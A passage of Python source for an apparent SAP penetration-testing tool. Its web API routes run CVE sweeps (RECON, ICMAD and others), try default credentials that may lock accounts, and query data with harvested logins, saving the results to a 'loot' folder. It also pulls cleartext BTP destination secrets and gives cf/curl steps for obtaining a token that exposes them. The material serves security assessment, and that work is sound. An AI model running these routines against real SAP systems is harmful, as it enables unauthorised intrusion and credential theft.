          - cve_22536     — every HTTP-serving stack (ABAP/Java/WD)
          - router_info   — SAProuter nodes only
          - default_creds — opt-in (may LOCK accounts after failed
                              attempts; the GUI surfaces a warning)
        """
        response.content_type = "application/json"
        data = request.json or {}
        selected = data.get("checks") or {
            "gw": True, "ms": True, "cve_31324": True,
            "cve_6287": True, "cve_22536": True, "router_info": True,
            "default_creds": False,
        }
        nodes = list(api.state.nodes.values())
        if not nodes:
            return json.dumps({"error": "No systems on the map"})

        def _run():
            import sapmap_stop
            import time as _time
            sapmap_stop.reset_stop()
            total = len(nodes)
            default_creds_hits = set()
            print(f"[*] Scan for All Vulnerabilities — {total} system(s)")
            for idx, node in enumerate(nodes, 1):
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — vuln sweep aborted "
                          f"({idx-1}/{total} processed)")
                    return
                # Small gap between nodes so each target's gateway / MS has
                # a moment to reset NI buffer state before we hit it again.
                # Without this, P2 (F_SAP_INIT) occasionally goes silent
                # on the second-or-later probe in a rapid sweep even though
                # the target is vulnerable — the P1+P2 retry inside
                # check_gw_vulnerable catches most of these, but a 1 s
                # breather up front reduces the rate of the retry path.
                if idx > 1:
                    _time.sleep(1.0)
                sys_type = (node.system_type or "").upper()
                is_java = "JAVA" in sys_type
                is_router = "ROUTER" in sys_type
                print(f"[*] [{idx}/{total}] {node.sid} "
                      f"({node.system_type or '?'}) — running vuln checks")

                # 1. Gateway (every SAP system — skip pure routers)
                if selected.get("gw") and not is_router:
                    try:
                        print(f"[*] {node.sid}: check_gw")
                        sapmap_exploit.check_gw_vulnerable(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_gw failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 2. MS betrusted / CVE-2020-6207 (every SAP system)
                if selected.get("ms") and not is_router:
                    try:
                        print(f"[*] {node.sid}: check_ms_betrusted")
                        sapmap_scanner.check_ms_betrusted(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_ms failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 3. CVE-2025-31324 — Java / double-stack only
                if selected.get("cve_31324") and is_java:
                    try:
                        print(f"[*] {node.sid}: check_cve_2025_31324")
                        sapmap_scanner.check_cve_2025_31324(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_cve_31324 failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 4. CVE-2020-6287 (RECON) — Java / double-stack only
                if selected.get("cve_6287") and is_java:
                    try:
                        print(f"[*] {node.sid}: check_cve_2020_6287 (RECON)")
                        sapmap_scanner.check_cve_2020_6287(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_cve_6287 failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 5. CVE-2022-22536 (ICMAD HTTP smuggling) — every
                # HTTP-serving SAP stack: ABAP / Java / dedicated WD /
                # any node fingerprinted as is_web_dispatcher.  The
                # ICM Content-Length smuggling primitive lives in
                # the SAP ICM kernel module shared across these
                # stacks.  Skipped for SAProuter (no ICM).
                is_abap = "ABAP" in sys_type
                is_wd = "WEB_DISPATCHER" in sys_type
                is_http = (is_abap or is_java or is_wd
                             or getattr(node, "is_web_dispatcher", False))
                if selected.get("cve_22536") and not is_router and is_http:
                    try:
                        print(f"[*] {node.sid}: check_cve_2022_22536 (ICMAD)")
                        sapmap_scanner.check_cve_2022_22536(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_cve_22536 failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 6. SAProuter info leak — SAProuter nodes only
                if selected.get("router_info") and is_router:
                    try:
                        from sap_router_info import saprouter_info_request
                        host = node.ip or node.hostname
                        if host:
                            router_port = 3299
                            for inst in node.instances:
                                for port, svc in inst.ports.items():
                                    if svc == "saprouter":
                                        router_port = port
                                        break
                            print(f"[*] {node.sid}: check_router_info "
                                  f"({host}:{router_port})")
                            node.saprouter_info = saprouter_info_request(
                                host, router_port, timeout=10)
                            if node.saprouter_info.get("vulnerable"):
                                node.has_critical_finding = True
                                # Emit so the bus mirror writes a Finding
                                # to node.findings and the ATT&CK heatmap
                                # lights up T1018 + T1592.  The other two
                                # router-check paths (per-node + bulk
                                # "Check All SAProuter Info Leak") already
                                # do this; the bulk-vuln sweep was the
                                # only one not emitting.
                                sapmap_findings.emit_finding(
                                    "HIGH", node.sid,
                                    f"SAProuter info-leak succeeded on "
                                    f"{host}:{router_port} — "
                                    f"{node.saprouter_info.get('total_clients', 0)} "
                                    f"clients, routtab exposed",
                                    cve="CVE-2022-27668 (similar) / NIINFO leak",
                                    attack_capability="recon.saprouter_info",
                                )
                    except Exception as e:
                        print(f"[-] {node.sid}: check_router_info failed: {e}")

                # 7. Default credentials (DIAG) — opt-in.  May lock
                # accounts after the configured retry threshold; the GUI
                # makes the operator confirm before passing the flag.
                # Needs a 32XX dispatcher port — SAProuter nodes and
                # WD-only systems skip.
                if (selected.get("default_creds") and not is_router):
                    try:
                        from sap_default_creds import (
                            check_default_credentials,
                        )
                        host = node.ip or node.hostname
                        disp_port = None
                        for inst in node.instances:
                            for port, svc in inst.ports.items():
                                if svc == "dispatcher" or 3200 <= port <= 3299:
                                    disp_port = port
                                    break
                            if disp_port:
                                break
                        if host and disp_port:
                            clients = [c.get("nr") if isinstance(c, dict)
                                        else str(c) for c in node.clients]
                            clients = [c for c in clients if c] or ["000"]
                            print(f"[*] {node.sid}: check_default_creds "
                                  f"({host}:{disp_port}, clients={','.join(clients)})")
                            print(f"[!] {node.sid}: WARNING — failed "
                                  f"login attempts may LOCK accounts!")
                            findings = check_default_credentials(
                                host, disp_port, clients,
                                timeout=10, verbose=True,
                                saprouter=node.saprouter)
                            if findings:
                                from sapmap_models import Credentials
                                print(f"[+] {node.sid}: "
                                      f"{len(findings)} default credential(s)")
                                for f in findings:
                                    cred = Credentials(
                                        username=f["username"],
                                        password=f["password"],
                                        client=f["client"],
                                        instance_nr=(node.instance_nrs()[0]
                                                      if node.instance_nrs()
                                                      else "00"),
                                        verified=(f["result"] == "SUCCESS"),
                                    )
                                    if not any(c.username == cred.username
                                                and c.client == cred.client
                                                for c in node.credentials):
                                        node.credentials.append(cred)
                                        print(f"    [{f['severity']}] "
                                              f"{f['username']}:{f['password']} "
                                              f"client {f['client']} — "
                                              f"{f['detail']}")
                                default_creds_hits.add(node.sid)
                        else:
                            print(f"[-] {node.sid}: check_default_creds "
                                  f"skipped — no dispatcher port reachable")
                    except ImportError:
                        print(f"[-] {node.sid}: sap_default_creds module "
                              f"not available")
                    except Exception as e:
                        print(f"[-] {node.sid}: check_default_creds failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

            vulns = []
            for n in nodes:
                hits = []
                if n.gw_vulnerable: hits.append("GW")
                if n.ms_vulnerable: hits.append("10KBlaze")
                if getattr(n, "cve_2025_31324_vulnerable", False):
                    hits.append("CVE-2025-31324")
                if getattr(n, "cve_2020_6287_vulnerable", False):
                    hits.append("RECON")
                if getattr(n, "cve_2022_22536_vulnerable", False):
                    hits.append("ICMAD")
                if (getattr(n, "saprouter_info", None)
                        and n.saprouter_info.get("vulnerable")):
                    hits.append("Router-InfoLeak")
                if n.sid in default_creds_hits:
                    hits.append("DefaultCreds")
                if hits:
                    vulns.append(f"{n.sid}: {', '.join(hits)}")
            print(f"[+] Vuln sweep complete — {len(vulns)} system(s) with findings")
            for v in vulns:
                print(f"    {v}")

        _bg("_check_all_vulns", "Scan for All Vulnerabilities", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/created_users")
    def actions_created_users():
        response.content_type = "application/json"
        users = sapmap_cleanup.list_created_users(api.state)
        return json.dumps({"users": users})

    @app.route("/api/actions/created_destinations")
    def actions_created_destinations():
        response.content_type = "application/json"
        return json.dumps({"destinations": api.state.created_destinations})

    @app.route("/api/actions/clear_created_destinations", method="POST")
    def actions_clear_created_destinations():
        response.content_type = "application/json"
        state_mgr.clear_created_destinations(api.state)
        return json.dumps({"status": "ok"})

    # -- State save/load --
    @app.route("/api/state/save", method="POST")
    def api_state_save():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            filepath = state_mgr.auto_save_path()
        else:
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        try:
            state_mgr.save_state(api.state, filepath)
            return json.dumps({"status": "ok", "path": filepath})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/load", method="POST")
    def api_state_load():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            return json.dumps({"error": "No file specified"})

        # Try as absolute path, then relative to states dir
        filepath = name
        if not os.path.isabs(filepath):
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        if not filepath.endswith(".sapmap") and not filepath.endswith(".json"):
            filepath += ".sapmap"

        try:
            api.state = state_mgr.load_state(filepath)
            try:
                sapmap_findings.attach_state(api.state)
            except Exception:
                pass
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/upload", method="POST")
    def api_state_upload():
        """Load state from an uploaded file (browser file picker)."""
        response.content_type = "application/json"
        try:
            data = request.json
            if not data:
                return json.dumps({"error": "No data received"})
            api.state = SAPMAPState.from_dict(data)
            try:
                sapmap_findings.attach_state(api.state)
            except Exception:
                pass
            if isinstance(data, dict) and data.get("_findings"):
                try:
                    sapmap_findings.load_snapshot(data["_findings"])
                except Exception:
                    pass
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    # -- Business Impact Assessment --
    @app.route("/api/node/<sid>/impact/assess", method="POST")
    def node_impact_assess(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        scenario = data.get("scenario")  # None = run all
        client = data.get("client")      # None = best_credentials

        def _run():
            if client:
                # Find credentials matching the requested client
                creds = None
                for cu in node.created_users:
                    if cu.client == client:
                        creds = Credentials(username=cu.username, password=cu.password,
                                            client=cu.client, instance_nr=cu.instance_nr,
                                            verified=True)
                        break
                if not creds:
                    for c in node.credentials:
                        if c.client == client:
                            creds = c
                            break
                if not creds:
                    # Fallback: use best_credentials and override client
                    creds = node.best_credentials()
                    if creds:
                        creds = Credentials(username=creds.username,
                                            password=creds.password,
                                            client=client,
                                            instance_nr=creds.instance_nr,
                                            verified=creds.verified)
            else:
                creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            import sapmap_impact
            # Map impact Severity.value (1..5) → findings bus severity.
            # Only scenarios that actually returned data (record_count>0)
            # are worth surfacing — empty reads are just noise.
            def _sev_for(sev_value: int) -> str:
                if sev_value >= 5: return "CRITICAL"
                if sev_value == 4: return "HIGH"
                if sev_value == 3: return "MEDIUM"
                return "INFO"

            if scenario:
                print(f"[*] {sid}: Running impact scenario '{scenario}'...")
                r = sapmap_impact.assess_one(node, creds, scenario)
                if r:
                    # Replace or append
                    node.impact_results = [
                        ir for ir in node.impact_results
                        if ir.get("scenario") != scenario
                    ]
                    node.impact_results.append(r.to_dict())
                    print(f"  [{r.severity_label}] {r.headline}")
                    if r.record_count > 0 and not r.error:
                        sapmap_findings.emit_finding(
                            _sev_for(r.severity.value), sid,
                            f"Business impact [{r.scenario}]: {r.headline} "
                            f"({r.record_count} record(s))",
                        )
            else:
                print(f"[*] {sid}: Running all business impact scenarios...")
                results = sapmap_impact.assess_all(
                    node, creds, state=api.state)
                node.impact_results = [r.to_dict() for r in results]
                crit = sum(1 for r in results if r.severity.value >= 5)
                high = sum(1 for r in results if r.severity.value == 4)
                total = len([r for r in results if r.record_count > 0])
                print(f"[+] {sid}: {total} impact scenarios with data "
                      f"({crit} critical, {high} high)")
                # Per-scenario finding for each hit so the drawer gets
                # full detail; plus a single roll-up row so the banner
                # shows the headline count without 20 slide-ins.
                for r in results:
                    if r.record_count > 0 and not r.error:
                        sapmap_findings.emit_finding(
                            _sev_for(r.severity.value), sid,
                            f"Business impact [{r.scenario}]: {r.headline} "
                            f"({r.record_count} record(s))",
                        )
                if total > 0:
                    roll_sev = "CRITICAL" if crit else ("HIGH" if high
                                                         else "MEDIUM")
                    sapmap_findings.emit_finding(
                        roll_sev, sid,
                        f"Business-impact assessment: {total} scenario(s) "
                        f"returned data ({crit} critical, {high} high)",
                    )

        _bg(f"{sid}:impact", "Business Impact Assessment", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/impact")
    def node_impact_get(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        return json.dumps({
            "sid": sid,
            "results": node.impact_results,
        })

    # Two routes for the same handler — the path-style accepts the
    # scenario name as a positional segment (legacy ABAP scenarios with
    # short alphanumeric names), the query-style accepts it as ?scenario=
    # so names containing characters Bottle's <name> placeholder rejects
    # (slashes and spaces in Java scenario names like "PI/PO Message
    # Tampering") still work.
    @app.route("/api/node/<sid>/impact/export")
    def node_impact_export_query(sid):
        return _node_impact_export(sid, request.params.get("scenario", ""))

    @app.route("/api/node/<sid>/impact/export/<scenario_name>")
    def node_impact_export_path(sid, scenario_name):
        return _node_impact_export(sid, scenario_name)

    def _node_impact_export(sid, scenario_name):
        response.content_type = "application/json"
        if not scenario_name:
            return json.dumps({"error": "scenario name is required"})
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        # 1. Try the cached results on the node first.  Java impact
        #    scenarios are probe-only (no creds + no re-run path), and
        #    even for ABAP this avoids a duplicate RFC round trip when
        #    we already have the data.
        cached = next(
            (r for r in (node.impact_results or [])
             if r.get("scenario") == scenario_name),
            None,
        )

        records = []
        if cached and cached.get("sample_records"):
            records = cached["sample_records"]
        else:
            # 2. Fallback: re-run the ABAP scenario via RFC.  Only
            #    available when ABAP credentials exist on the node.
            import sapmap_impact
            creds = node.best_credentials()
            if not creds:
                return json.dumps({
                    "error": "No cached records for this scenario "
                             "and no credentials available to re-run"
                })
            try:
                result = sapmap_impact.assess_one(node, creds, scenario_name)
            except Exception as e:
                return json.dumps({"error": f"Query failed: {e}"})
            if not result or not result.sample_records:
                return json.dumps({"error": "No data for this scenario"})
            records = result.sample_records

        # Normalise the row shape: dict (ABAP) → multi-column CSV,
        # plain string (Java) → single-column CSV with header "evidence".
        import io, csv
        buf = io.StringIO()
        if records and isinstance(records[0], dict):
            columns = [c for c in records[0].keys()
                        if not isinstance(records[0].get(c), (list, dict))]
            writer = csv.DictWriter(buf, fieldnames=columns,
                                      extrasaction="ignore")
            writer.writeheader()
            for row in records:
                writer.writerow({k: row.get(k, "") for k in columns})
        else:
            writer = csv.writer(buf)
            writer.writerow(["evidence"])
            for row in records:
                writer.writerow([str(row)])

        # Save to loot/bia/ folder
        import sapmap_state
        loot_dir = sapmap_state.ensure_loot_dir("bia")
        # Sanitise the scenario name for the filename — slashes and
        # spaces would otherwise produce invalid paths.
        import re as _re
        safe_scn = _re.sub(r"[^A-Za-z0-9._-]+", "_", scenario_name)
        filename = f"bia_{sid}_{safe_scn}.csv"
        filepath = os.path.join(loot_dir, filename)
        with open(filepath, "w", newline="") as f:
            f.write(buf.getvalue())

        print(f"[+] Exported {len(records)} records to {filepath}")
        return json.dumps({
            "status": "ok",
            "file": filepath,
            "records": len(records),
            "filename": filename,
        })

    @app.route("/api/local_ip")
    def local_ip():
        response.content_type = "application/json"
        import socket as _sock
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
        except Exception:
            ip = ""
        return json.dumps({"ip": ip})

    @app.route("/api/impact/scenarios")
    def impact_scenarios():
        response.content_type = "application/json"
        import sapmap_impact
        return json.dumps(sapmap_impact.list_scenarios())

    # -- Export --
    @app.route("/api/export/json")
    def export_json():
        response.content_type = "application/json"
        response.headers["Content-Disposition"] = (
            f'attachment; filename="sapmap_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json"'
        )
        return api.state.to_json(indent=2)

    @app.route("/api/export/report")
    def export_report():
        """Build the engagement report in BOTH Markdown and HTML
        formats and write them to loot/reports/.

        The HTML version is a single self-contained file with embedded
        CSS — opens in any browser, prints to PDF cleanly, looks like
        something you can hand to management without apologising.

        We do NOT stream either body back as a download — pywebview's
        embedded Chromium navigates the main window when a blob/data
        response comes back, which replaces the map with the raw
        report.  Files are written server-side, the JSON response
        carries the paths so the GUI can show them in a toast.
        """
        from sapmap_report import build_markdown_report, build_html_report
        import sapmap_state as _ss
        response.content_type = "application/json"
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        try:
            md = build_markdown_report(api.state)
            html = build_html_report(api.state)
            reports_dir = _ss.ensure_loot_dir("reports")
            md_path = os.path.join(reports_dir, f"sapmap_report_{ts}.md")
            html_path = os.path.join(reports_dir, f"sapmap_report_{ts}.html")
            with open(md_path, "w", encoding="utf-8") as fh:
                fh.write(md)
            with open(html_path, "w", encoding="utf-8") as fh:
                fh.write(html)
            print(f"[+] Engagement report (Markdown) -> {md_path} "
                  f"({len(md)} bytes)")
            print(f"[+] Engagement report (HTML)     -> {html_path} "
                  f"({len(html)} bytes)")
            return json.dumps({
                "ok": True,
                "md_path":   md_path,
                "html_path": html_path,
                "md_bytes":   len(md),
                "html_bytes": len(html),
            })
        except Exception as e:
            print(f"[-] Failed to write reports under loot/reports/: {e}")
            import traceback; traceback.print_exc()
            return json.dumps({"ok": False, "error": str(e)})

    # -- Diff between runs --
    @app.route("/api/diff/list_states")
    def diff_list_states():
        """Return every .sapmap file in the states/ directory, plus a
        synthetic 'in-memory' entry pointing at the live state."""
        import sapmap_state as _ss
        response.content_type = "application/json"
        files = []
        try:
            for fn in sorted(os.listdir(_ss.STATE_DIR), reverse=True):
                if not fn.endswith(".sapmap"):
                    continue
                path = os.path.join(_ss.STATE_DIR, fn)
                try:
                    st = os.stat(path)
                    files.append({
                        "path": path,
                        "name": fn,
                        "size": st.st_size,
                        "mtime": datetime.fromtimestamp(st.st_mtime)
                                  .strftime("%Y-%m-%d %H:%M:%S"),
                    })
                except OSError:
                    continue
        except FileNotFoundError:
            pass
        return json.dumps({"ok": True, "files": files})

    @app.route("/api/diff/compute", method="POST")
    def diff_compute():
        """Body: {baseline: <path>, current: <path|"__in_memory__">}.
        Loads both states (or uses live state for "__in_memory__"),
        computes the diff, writes Markdown + HTML reports under
        loot/reports/, returns metadata."""
        from sapmap_diff import compute_state_diff, build_diff_html, build_diff_markdown
        from sapmap_state import load_state
        import sapmap_state as _ss
        response.content_type = "application/json"
        data = request.json or {}
        base_path = (data.get("baseline") or "").strip()
        curr_path = (data.get("current") or "").strip()
        if not base_path or not curr_path:
            return json.dumps({"ok": False,
                               "error": "Both 'baseline' and 'current' required"})

        try:
            if base_path == "__in_memory__":
                base_state = api.state
                base_label = "(live, in-memory)"
            else:
                base_state = load_state(base_path)
                base_label = os.path.basename(base_path)
            if curr_path == "__in_memory__":
                curr_state = api.state
                curr_label = "(live, in-memory)"
            else:
                curr_state = load_state(curr_path)
                curr_label = os.path.basename(curr_path)
        except Exception as e:
            return json.dumps({"ok": False,
                               "error": f"Failed to load state file(s): {e}"})

        try:
            diff = compute_state_diff(base_state, curr_state,
                                        baseline_label=base_label,
                                        current_label=curr_label)
            md = build_diff_markdown(diff)
            html = build_diff_html(diff)

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            reports_dir = _ss.ensure_loot_dir("reports")
            md_path = os.path.join(reports_dir, f"sapmap_diff_{ts}.md")
            html_path = os.path.join(reports_dir, f"sapmap_diff_{ts}.html")
            with open(md_path, "w", encoding="utf-8") as fh:
                fh.write(md)
            with open(html_path, "w", encoding="utf-8") as fh:
                fh.write(html)

            print(f"[+] Engagement diff (Markdown) -> {md_path} "
                  f"({len(md)} bytes)")
            print(f"[+] Engagement diff (HTML)     -> {html_path} "
                  f"({len(html)} bytes)")
            return json.dumps({
                "ok":          True,
                "summary":     diff["summary"],
                "md_path":     md_path,
                "html_path":   html_path,
                "md_bytes":    len(md),
                "html_bytes":  len(html),
                "baseline_label": base_label,
                "current_label":  curr_label,
            })
        except Exception as e:
            import traceback; traceback.print_exc()
            return json.dumps({"ok": False, "error": str(e)})

    # ----------------------------------------------------------------
    # BTP — subaccount + destinations enumeration via cf oauth-token
    # ----------------------------------------------------------------
    @app.route("/api/btp/set_token", method="POST")
    def btp_set_token():
        """Body: {token: <jwt>}.  Decodes the token to learn its region
        and identity, stores it in process memory keyed by region, and
        returns a sanitised summary suitable for the GUI.

        Token NEVER serialises to disk — kept on api.btp_tokens dict,
        wiped on process exit.
        """
        from sap_btp import validate_token
        response.content_type = "application/json"
        data = request.json or {}
        token = (data.get("token") or "").strip()
        if not token:
            return json.dumps({"ok": False,
                               "error": "Empty token — paste a `cf oauth-token` value"})
        info = validate_token(token)
        if not info.get("ok"):
            return json.dumps(info)
        region = info["region"]
        if not region or region == "(unknown)":
            return json.dumps({
                "ok": False,
                "error": (f"Could not extract region from token's `iss` claim "
                          f"(got {info.get('issuer','')!r}).  Token may be from "
                          f"a non-public BTP region or hand-rolled — abort.")
            })
        api.btp_tokens[region] = token
        print(f"[+] BTP token stored for region={region} "
              f"user={info.get('user','')} "
              f"expires_in={info.get('expires_in_seconds',0)}s "
              f"(fingerprint={info['fingerprint']})")
        # Don't echo the token; return only its fingerprint + identity
        info.pop("issuer", None); info.pop("audience", None)
        info["stored"] = True
        return json.dumps(info)

    @app.route("/api/btp/clear_token", method="POST")
    def btp_clear_token():
        response.content_type = "application/json"
        data = request.json or {}
        region = (data.get("region") or "").strip()
        if region:
            api.btp_tokens.pop(region, None)
            print(f"[*] BTP token cleared for region={region}")
        else:
            api.btp_tokens.clear()
            print("[*] BTP tokens cleared (all regions)")
        return json.dumps({"ok": True, "regions_left": list(api.btp_tokens.keys())})

    @app.route("/api/btp/regions")
    def btp_regions():
        """List the regions for which a token is currently stored."""
        response.content_type = "application/json"
        return json.dumps({"ok": True,
                           "regions": list(api.btp_tokens.keys())})

    @app.route("/api/btp/proxy_override", method="GET")
    def btp_get_proxy_override():
        """Return the current connectivity-proxy override + whether
        a connectivity-service auth token is in memory (the token
        value itself NEVER crosses to the frontend)."""
        response.content_type = "application/json"
        return json.dumps({
            "ok":               True,
            "proxy_host":       api.btp_proxy_override or "",
            "proxy_auth_token_present": bool(api.btp_proxy_auth_token),
        })

    @app.route("/api/btp/proxy_override", method="POST")
    def btp_set_proxy_override():
        """Set the connectivity-proxy override AND/OR the connectivity-
        service auth token used by the PP-impersonation live probe.
        Stored in process memory only — wiped on restart, never
        written to disk.

        Body (all optional, at least one required):
          ``{"proxy_host":       "localhost:20003"}``
          ``{"proxy_auth_token": "<JWT from connectivity service>"}``
        """
        response.content_type = "application/json"
        data = request.json or {}
        host = (data.get("proxy_host") or "").strip()
        auth_tok = (data.get("proxy_auth_token") or "").strip()
        if not host and not auth_tok:
            return json.dumps({"ok": False,
                               "error": "proxy_host and/or "
                                         "proxy_auth_token required"})
        if host:
            api.btp_proxy_override = host
            print(f"[*] BTP connectivity-proxy override set: {host!r}")
        if auth_tok:
            api.btp_proxy_auth_token = auth_tok
            print(f"[*] BTP connectivity-service auth token stored "
                  f"({len(auth_tok)} chars)")
        return json.dumps({
            "ok":          True,
            "proxy_host":  api.btp_proxy_override or "",
            "proxy_auth_token_present": bool(api.btp_proxy_auth_token),
        })

    @app.route("/api/btp/proxy_override", method="DELETE")
    def btp_clear_proxy_override():
        """Clear the connectivity-proxy override AND the connectivity-
        service auth token."""
        response.content_type = "application/json"
        api.btp_proxy_override = ""
        api.btp_proxy_auth_token = ""
        print("[*] BTP connectivity-proxy override + auth token cleared")
        return json.dumps({"ok": True, "proxy_host": "",
                           "proxy_auth_token_present": False})

    @app.route("/api/btp/pull_destinations_for_token", method="POST")
    def btp_pull_destinations_for_token():
        """For a destination-service-scoped token (cf create-service-key
        destination ...), pull every destination from the bound
        subaccount and capture cleartext where AccessClientSecrets is
        granted.  No subaccount enumeration step needed - the token
        IS scoped to one specific subaccount."""
        from sap_btp import (
            pull_destinations_via_destination_token,
            link_destinations_to_onprem,
            extract_subaccount_id_from_destination_token,
            extract_subdomain_from_token,
            decode_token_claims,
        )
        from sapmap_models import BTPSubaccountNode
        response.content_type = "application/json"
        data = request.json or {}
        region = (data.get("region") or "").strip()
        token = api.btp_tokens.get(region) or ""
        if not token:
            return json.dumps({"ok": False,
                               "error": f"No token stored for region {region!r}"})
        try:
            dests, err, sub_uuid = pull_destinations_via_destination_token(
                token, region)
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})
        if err:
            return json.dumps({"ok": False, "error": err})

        # Materialise / refresh the BTPSubaccountNode for the bound sub
        sub_node = api.state.btp_subaccounts.get(sub_uuid)
        if sub_node is None:
            sub_node = BTPSubaccountNode(uuid=sub_uuid)
            api.state.btp_subaccounts[sub_uuid] = sub_node
        claims = decode_token_claims(token)
        sub_node.region = region
        sub_node.subdomain = (extract_subdomain_from_token(claims)
                                or sub_node.subdomain)
        sub_node.enumerated_at = datetime.now().isoformat()
        sub_node.destinations = dests
        _folded = api.state.fold_btp_placeholders(sub_node)
        if _folded:
            print(f"[+] folded {_folded} placeholder BTP node(s) "
                  f"into subaccount {sub_uuid[:8]}")

        before_disc = {s for s, n in api.state.nodes.items()
                        if n.discovered_via_btp}
        linked = link_destinations_to_onprem(api.state, sub_node)
        new_disc = [s for s, n in api.state.nodes.items()
                    if n.discovered_via_btp and s not in before_disc]
        for new_sid in new_disc:
            print(f"[*] Auto-scanning fresh BTP placeholder {new_sid} …")
            _kick_standard_scan(new_sid)
        captured = sum(1 for d in dests if d.cleartext_captured)
        prd_targets = sum(
            1 for d in dests
            if d.linked_target_sid
            and api.state.nodes.get(d.linked_target_sid)
            and api.state.nodes[d.linked_target_sid].is_production)
        print(f"[+] BTP {region}/{sub_uuid[:8]}: pulled {len(dests)} "
              f"destination(s) via destination-service token, "
              f"{captured} cleartext, {linked} linked to on-prem, "
              f"{prd_targets} reach PRD")
        if captured:
            try:
                sapmap_findings.emit_finding(
                    "CRITICAL", f"BTP:{sub_uuid[:8]}",
                    f"BTP subaccount {sub_node.subdomain or sub_uuid} "
                    f"stores {captured} cleartext on-prem credential(s) "
                    f"in destinations.  Anyone with AccessClientSecrets "
                    f"on the destination service can pull them.",
                    ref="btp.cleartext.captured",
                    meta={"subaccount": sub_uuid, "count": captured})
            except Exception:
                pass
        return json.dumps({
            "ok":                  True,
            "subaccount_uuid":     sub_uuid,
            "subdomain":           sub_node.subdomain,
            "destinations":        len(dests),
            "cleartext_captured":  captured,
            "linked_to_onprem":    linked,
            "prd_targets":         prd_targets,
        })

    @app.route("/api/btp/enumerate", method="POST")
    def btp_enumerate():
        """Body: {region: <string>}.  Hits the BTP API to list every
        subaccount the token can reach + every Cloud Connector tunnel
        registered with them.  ALSO pulls the Cloud Foundry topology
        (orgs / spaces / apps / service instances) — this is the data
        a stock `cf oauth-token` can actually see, since CF tokens
        carry `cloud_controller.read` rather than the
        subaccount-admin / destination_configuration.ApiAccess scopes
        needed for the BTP-control-plane endpoints.

        Pre-creates BTPSubaccountNode objects in
        api.state.btp_subaccounts (no destinations yet — those are
        pulled by /api/btp/pull_destinations).
        """
        from sap_btp import (
            enumerate_subaccounts, pull_scc_mappings, pull_cf_topology,
            decode_token_claims,
        )
        from sapmap_models import BTPSubaccountNode
        response.content_type = "application/json"
        data = request.json or {}
        region = (data.get("region") or "").strip()
        token = api.btp_tokens.get(region) or ""
        if not token:
            return json.dumps({"ok": False,
                               "error": f"No token stored for region {region!r}"})

        # Decode token claims and detect kind so we route enumeration
        # to the APIs the token can actually reach.  Probing wrong
        # APIs (e.g. CF API with a destination-scoped token) returns
        # 401 noise, not real errors.
        from sap_btp import detect_token_kind
        claims = decode_token_claims(token)
        scopes = list(claims.get("scope") or claims.get("scopes") or [])
        kind, kind_desc = detect_token_kind(claims)

        # Build kind-aware warnings.  Don't warn about scopes the token
        # doesn't NEED for what it's good at.
        scope_warnings = []
        if kind == "cf":
            scope_warnings.append(
                "Token kind: `cf` (Cloud Foundry user token).  This is "
                "the normal output of `cf oauth-token`; it reaches the "
                "CF API (orgs / spaces / apps / service instances) but "
                "destinations and subaccount admin endpoints are out of "
                "scope.  To capture cleartext destinations, mint a "
                "destination-service token:\n"
                "  1. `cf login -a https://api.cf.eu10-<NN>.hana.ondemand.com` "
                "(replace `<NN>` with the region suffix shown in BTP "
                "cockpit, e.g. `004`).\n"
                "  2. Pick an org during login; note the org and space "
                "names.\n"
                "  3. `cf target -o \"<ORG>\" -s <SPACE>` to point at the "
                "subaccount you want to read.\n"
                "  4. `cf create-service destination lite sapmap-dest && "
                "cf create-service-key sapmap-dest sapmap-dest-key && "
                "cf service-key sapmap-dest sapmap-dest-key`.\n"
                "  5. From step 4's output grab `uaa.url`, `uaa.clientid` "
                "and `uaa.clientsecret`, then exchange for a token:\n"
                "     `curl -X POST \"<UAA_URL>/oauth/token\" "
                "-u '<CLIENT_ID>:<CLIENT_SECRET>' "
                "-d \"grant_type=client_credentials\" | jq -r .access_token`\n"
                "  6. Paste that token back into SAPMAP — it will be "
                "auto-detected as `destination` kind and the "
                "**Pull destinations** action will appear.")
        elif kind == "destination":
            scope_warnings.append(
                "Token kind: `destination` (service-key issued).  "
                "Reaches the Destination Service for ONE bound "
                "subaccount.  Subaccount enumeration + CF API are out "
